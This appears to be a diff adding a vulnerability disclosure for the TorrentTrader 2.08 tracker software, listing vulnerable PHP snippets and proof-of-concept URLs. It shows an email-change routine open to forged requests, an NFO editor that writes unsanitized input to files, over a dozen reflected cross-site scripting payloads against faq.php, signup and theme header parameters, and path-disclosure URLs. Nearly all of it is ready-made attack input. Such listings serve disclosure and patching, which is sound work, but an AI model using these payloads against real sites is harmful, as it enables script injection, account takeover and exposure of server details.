@@ -1,0 +1,72 @@
+http://www.example.com/torrenttrader208/account-ce.php?id=1&secret=b642b4217b34b1e8d3bd915fc65c4452&email=test@test.com
+
+-----------------[ source code start ]---------------------------------
+$id = (int) $_GET["id"];
+$md5 = $_GET["secret"];
+$email = $_GET["email"];
+...
+$res = SQL_Query_exec("SELECT `editsecret` FROM `users` 
+WHERE `enabled` = 'yes' AND `status` = 'confirmed' AND `id` = '$id'");
+
+$row = mysql_fetch_assoc($res);
+...
+$sec = $row["editsecret"];
+
+if ($md5 != md5($sec . $email . $sec))
+show_error_msg(T_("ERROR"), T_("NOTHING_FOUND"), 1);
+
+SQL_Query_exec("UPDATE `users` SET `editsecret` = '', `email` = ".sqlesc($email)."
+WHERE `id` = '$id' AND `editsecret` = " . sqlesc($row["editsecret"]));
+-----------------[ source code end ]-----------------------------------
+
+http://www.example.com/torrenttrader208/nfo-edit.php
+
+-----------------[ source code start ]---------------------------------
+$id = (int)$_GET["id"]?$_GET["id"]:$_POST["id"]; 
+$do = $_POST["do"];
+
+$nfo = $site_config["nfo_dir"] . "/$id.nfo";
+
+if ($do == "update") { 
+if (file_put_contents($nfo, $_POST["content"])) 
+{
+write_log("NFO ($id) was updated by $CURUSER[username].");
+-----------------[ source code end ]-----------------------------------
+
+http://www.example.com/torrenttrader208/faq.php?faq_categ[0][title]=<script>alert(String.fromCharCode(88,83,83))</script>&faq_categ[0][flag]=1&faq_categ[0][items][0][question]=aa&faq_categ[0][items][0][answer]=bb&faq_categ[0][items][0][flag]=1
+
+http://www.example.com/torrenttrader208/faq.php?faq_categ[0][title]=test&faq_categ[0][flag]=1&faq_categ[0][items][0][question]=<script>alert(String.fromCharCode(88,83,83))</script>&faq_categ[0][items][0][answer]=bb&faq_categ[0][items][0][flag]=1
+
+http://www.example.com/torrenttrader208/faq.php?faq_categ[0][title]=test&faq_categ[0][flag]=1&faq_categ[0][items][0][question]=test&faq_categ[0][items][0][answer]=
+<script>alert(String.fromCharCode(88,83,83))</script>&faq_categ[0][items][0][flag]=1
+
+http://www.example.com/torrenttrader208/account-signup.php?invite_row=1&invite="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/torrenttrader208/account-signup.php?invite_row=1&secret="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/torrenttrader208/themes/default/header.php?title=</title><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/torrenttrader208/themes/default/header.php?site_config[CHARSET]="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/torrenttrader208/themes/default/header.php?site_config[SITEURL]=--><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/torrenttrader208/themes/NB-Clean/header.php?title=</title><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/torrenttrader208/themes/NB-Clean/header.php?site_config[CHARSET]="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/torrenttrader208/themes/NB-Clean/header.php?site_config[SITEURL]="><script>alert(String.fromCharCode(88,83,83))</script>
+
+http://www.example.com/torrenttrader208/account-login.php?returnto[]
+
+http://www.example.com/torrenttrader208/themes/default/footer.php
+
+http://www.example.com/torrenttrader208/themes/default/header.php
+
+http://www.example.com/torrenttrader208/themes/NB-Clean/footer.php
+
+http://www.example.com/torrenttrader208/faq.php?faq_categ=1
+
+http://www.example.com/torrenttrader208/rss.php?cat[]
+
+http://www.example.com/torrenttrader208/backend/smilies.php?action=display&form[]
+
